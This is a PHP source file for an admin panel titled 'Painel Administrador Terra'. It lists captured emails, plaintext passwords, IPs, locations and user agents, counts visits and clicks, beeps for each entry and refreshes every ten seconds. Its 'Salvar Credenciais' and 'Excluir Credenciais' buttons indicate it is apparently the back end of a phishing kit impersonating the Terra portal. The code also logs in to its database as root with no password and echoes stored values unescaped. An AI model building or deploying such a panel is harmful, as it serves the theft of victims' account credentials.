<?php
session_start();

if (!isset($_SESSION["admin"]) || $_SESSION["admin"] !== true) {
    header("Location: login_admin.php");
    exit();
}

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "terra";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Erro na conexão com o banco de dados: " . $conn->connect_error);
}

// Obtém a contagem de acessos
$sql = "SELECT COUNT(*) AS total_acessos FROM acessos";
$result = $conn->query($sql);

$total_acessos = 0;
if ($result->num_rows > 0) {
    $row = $result->fetch_assoc();
    $total_acessos = $row['total_acessos'];
}

// Consulta SQL para recuperar as informações dos usuários
$sql = "SELECT * FROM usuarios";
$result = $conn->query($sql);
?>

<!DOCTYPE html>
<html lang='pt-br'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>Painel Terra</title>
    <link rel='stylesheet' href='styles/usu_styles.css'>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f2f2f2;
            display: flex;
        }

        .sidebar {
            width: 250px;
            background-color: #333;
            color: #fff;
            padding: 20px;
            box-sizing: border-box;
        }

        .sidebar h2 {
            margin-top: 0;
        }

        .sidebar button {
            display: block;
            margin-bottom: 10px;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            background-color: #555;
            color: #fff;
            font-size: 16px;
            width: 100%;
            text-align: left;
            transition: background-color 0.3s;
        }

        .sidebar button:hover {
            background-color: #444;
        }

        .main-content {
            flex-grow: 1;
            padding: 20px;
            box-sizing: border-box;
        }

        .header {
            background-color: #333;
            color: #fff;
            padding: 20px;
            text-align: center;
        }

        .header h1 {
            margin: 0;
        }

        .header p {
            margin-top: 5px;
        }

        .container {
            margin: 20px auto;
            max-width: 100%;
        }

        .content {
            width: 100%;
        }

        .user-info {
            display: flex;
            align-items: center;
            border: 1px solid #ccc;
            border-radius: 5px;
            margin-bottom: 10px;
            padding: 10px;
            width: 100%;
        }

        .user-info p {
            margin: 5px;
            flex: 1;
        }

        .user-info button {
            margin-left: auto;
        }

        .user-info button:hover {
            background-color: #d00;
        }

        .footer {
            background-color: #333;
            color: #fff;
            text-align: center;
            padding: 10px 0;
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
        }
    </style>
</head>
<body>
    <div class='sidebar'>
        <h2>Menu</h2>
        <button onclick="salvarInformacoes()">Salvar Credenciais</button>
        <button onclick="excluirTodasInformacoes()">Excluir Credenciais</button>
        <button onclick="limparClicks()">Limpar Clicks</button>
        <button onclick="trocarSenha()">Trocar Senha</button>
        <div class="countdown" id="countdown-info"></div>
    </div>

    <div class='main-content'>
        <div class='header'>
            <h1>Painel Administrador Terra</h1>
            <p></p>
            <div id="contadorAcessos">
                <?php echo "Total de acessos: " . $total_acessos; ?>
            </div>
        </div>

        <div class='container'>
            <div class='content'>
                <div class='user-info'>
                    <p>ID</p>
                    <p>Email</p>
                    <p>Senha</p>
                    <p>IP</p>
                    <p>Data/Hora</p>
                    <p>Localização</p>
                    <p>User Agent</p>
                    <p>Ações</p>
                </div>
                <?php
                if ($result->num_rows > 0) {
                    while ($row = $result->fetch_assoc()) {
                        echo "<div class='user-info'>";
                        echo "<p class='user-id'>" . $row["id"] . "</p>";
                        echo "<p class='user-email'>" . $row["email"] . "</p>";
                        echo "<p class='user-senha'>" . $row["senha"] . "</p>";
                        echo "<p class='user-ip'>" . $row["ip"] . "</p>";
                        echo "<p class='user-data-hora'>" . $row["data_hora"] . "</p>";
                        echo "<p class='user-localizacao'>" . $row["localizacao"] . "</p>";
                        echo "<p class='user-user-agent'>" . $row["user_agent"] . "</p>";
                        echo "<button onclick='excluirUsuario(" . $row["id"] . ")'>Excluir</button>";
                        echo "</div>";
                        echo "<script>document.getElementById('bip-sound').play();</script>";
                    }
                } else {
                    echo "<p>Nenhum usuário encontrado.</p>";
                }
                ?>
            </div>
        </div>

        <div class='footer'>
            <p>&copy; 2024 - Todos os direitos reservados Louis Vapo</p>
        </div>
    </div>

    <audio id='bip-sound' style='display: none;'><source src='bip.mp3' type='audio/mpeg'></audio>

    <script>
        function countdown() {
            var seconds = 10;
            var countdownElement = document.getElementById('countdown-info');

            var intervalId = setInterval(function() {
                countdownElement.textContent = 'Atualizando a página em ' + seconds + ' segundos.';
                seconds--;

                if (seconds < 0) {
                    clearInterval(intervalId);
                    location.reload();
                }
            }, 1000);
        }

        window.onload = function() {
            countdown();
        };

        function excluirUsuario(userId) {
            if (confirm("Tem certeza de que deseja excluir este usuário?")) {
                var xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        alert("Usuário excluído com sucesso!");
                        location.reload();
                    }
                };
                xhttp.open("GET", "excluir_usuario.php?userId=" + userId, true);
                xhttp.send();
            }
        }

        function salvarInformacoes() {
            window.location.href = "salvar_todas_informacoes.php";
        }

        function excluirTodasInformacoes() {
            if (confirm("Tem certeza de que deseja excluir todas as informações?")) {
                var xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        alert("Todas as informações foram excluídas com sucesso!");
                        location.reload();
                    }
                };
                xhttp.open("GET", "excluir_todas_informacoes.php", true);
                xhttp.send();
            }
        }

        function limparClicks() {
            if (confirm("Tem certeza de que deseja limpar todos os clicks?")) {
                var xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        alert("Todas os clicks foram limpos com sucesso!");
                        location.reload();
                    }
                };
                xhttp.open("GET", "limpar_clicks.php", true);
                xhttp.send();
            }
        }
    </script>
</body>
</html>

